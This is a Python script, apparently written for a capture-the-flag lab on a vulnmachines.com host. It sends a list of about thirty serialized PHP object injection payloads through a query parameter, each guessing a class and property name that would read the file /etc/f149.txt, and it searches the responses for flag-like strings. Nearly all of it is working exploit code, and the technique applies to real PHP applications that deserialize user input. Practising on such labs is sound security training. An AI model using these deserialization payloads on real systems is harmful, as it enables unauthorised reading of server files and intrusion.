#!/usr/bin/env python3
import requests
import urllib.parse
import re

base_url = "http://hackme11.vulnmachines.com:8056"

def test_payload(payload, description):
    encoded = urllib.parse.quote(payload)
    url = f"{base_url}/params?vnm={encoded}"
    
    response = requests.get(url, timeout=10)
    
    # Buscar flags en diferentes formatos
    patterns = [
        r'vulnmachines\{[^}]+\}',
        r'flag\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'vm\{[^}]+\}',
        r'VM\{[^}]+\}',
        r'[a-fA-F0-9]{32}(?![a-fA-F0-9])',  # MD5
        r'[a-fA-F0-9]{40}(?![a-fA-F0-9])',  # SHA1
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, response.text, re.IGNORECASE)
        if matches:
            # Filtrar falsos positivos (como hashes en URLs)
            for match in matches:
                if 'secops' not in match.lower() and 'logo' not in match.lower():
                    return match
    
    # Buscar contenido inusual que no sea HTML
    lines = response.text.split('\n')
    for line in lines:
        stripped = line.strip()
        # Buscar líneas que parezcan flags
        if stripped and not stripped.startswith('<') and not stripped.startswith('//'):
            if '{' in stripped and '}' in stripped:
                return stripped
            if len(stripped) == 32 and all(c in '0123456789abcdef' for c in stripped.lower()):
                return stripped
                
    return None

print("[*] Testing Lab 1 - PHP Object Injection")
print("[*] Target: /etc/f149.txt")
print()

# Lista exhaustiva de payloads
payloads = [
    # Clase FileReader (común en CTFs)
    ('O:10:"FileReader":1:{s:8:"filename";s:13:"/etc/f149.txt";}', 'FileReader class'),
    ('O:10:"FileReader":1:{s:4:"file";s:13:"/etc/f149.txt";}', 'FileReader with file'),
    ('O:10:"FileReader":1:{s:4:"path";s:13:"/etc/f149.txt";}', 'FileReader with path'),
    
    # Clase ReadFile
    ('O:8:"ReadFile":1:{s:8:"filename";s:13:"/etc/f149.txt";}', 'ReadFile class'),
    ('O:8:"ReadFile":1:{s:4:"file";s:13:"/etc/f149.txt";}', 'ReadFile with file'),
    ('O:8:"ReadFile":1:{s:4:"path";s:13:"/etc/f149.txt";}', 'ReadFile with path'),
    
    # Clase File
    ('O:4:"File":1:{s:8:"filename";s:13:"/etc/f149.txt";}', 'File class'),
    ('O:4:"File":1:{s:4:"path";s:13:"/etc/f149.txt";}', 'File with path'),
    ('O:4:"File":1:{s:4:"name";s:13:"/etc/f149.txt";}', 'File with name'),
    
    # Clase Logger (ya sabemos que responde diferente)
    ('O:6:"Logger":1:{s:7:"logfile";s:13:"/etc/f149.txt";}', 'Logger with logfile'),
    ('O:6:"Logger":1:{s:4:"file";s:13:"/etc/f149.txt";}', 'Logger with file'),
    ('O:6:"Logger":1:{s:8:"filename";s:13:"/etc/f149.txt";}', 'Logger with filename'),
    
    # Clase Debug
    ('O:5:"Debug":1:{s:4:"file";s:13:"/etc/f149.txt";}', 'Debug class'),
    ('O:5:"Debug":1:{s:8:"filename";s:13:"/etc/f149.txt";}', 'Debug with filename'),
    
    # Clase Vuln/VulnClass (relacionado con el nombre del sitio)
    ('O:4:"Vuln":1:{s:4:"file";s:13:"/etc/f149.txt";}', 'Vuln class'),
    ('O:9:"VulnClass":1:{s:4:"file";s:13:"/etc/f149.txt";}', 'VulnClass'),
    
    # Clase Flag con todas las variantes posibles
    ('O:4:"Flag":1:{s:4:"file";s:13:"/etc/f149.txt";}', 'Flag with file'),
    ('O:4:"Flag":1:{s:8:"filename";s:13:"/etc/f149.txt";}', 'Flag with filename'),
    ('O:4:"Flag":1:{s:4:"path";s:13:"/etc/f149.txt";}', 'Flag with path'),
    ('O:4:"Flag":1:{s:8:"filepath";s:13:"/etc/f149.txt";}', 'Flag with filepath'),
    ('O:4:"Flag":1:{s:6:"target";s:13:"/etc/f149.txt";}', 'Flag with target'),
    ('O:4:"Flag":1:{s:6:"source";s:13:"/etc/f149.txt";}', 'Flag with source'),
    
    # Clase Challenge/Lab1
    ('O:9:"Challenge":1:{s:4:"file";s:13:"/etc/f149.txt";}', 'Challenge class'),
    ('O:4:"Lab1":1:{s:4:"file";s:13:"/etc/f149.txt";}', 'Lab1 class'),
    
    # Clase SecOps/VulnMachines (basado en el sitio)
    ('O:6:"SecOps":1:{s:4:"file";s:13:"/etc/f149.txt";}', 'SecOps class'),
    ('O:12:"VulnMachines":1:{s:4:"file";s:13:"/etc/f149.txt";}', 'VulnMachines class'),
    
    # Clase Template/View (común en frameworks)
    ('O:8:"Template":1:{s:4:"file";s:13:"/etc/f149.txt";}', 'Template class'),
    ('O:4:"View":1:{s:4:"file";s:13:"/etc/f149.txt";}', 'View class'),
]

found = False
for payload, description in payloads:
    print(f"\n[*] Testing: {description}")
    print(f"    Payload: {payload[:60]}...")
    
    result = test_payload(payload, description)
    if result:
        print(f"\n[!!!] FLAG FOUND: {result}")
        print(f"[!!!] Working payload: {description}")
        found = True
        break

if not found:
    print("\n[-] Flag not found with standard payloads")
    print("[*] The application might use a custom class name")
    print("[*] Try checking the source code or error messages for class names")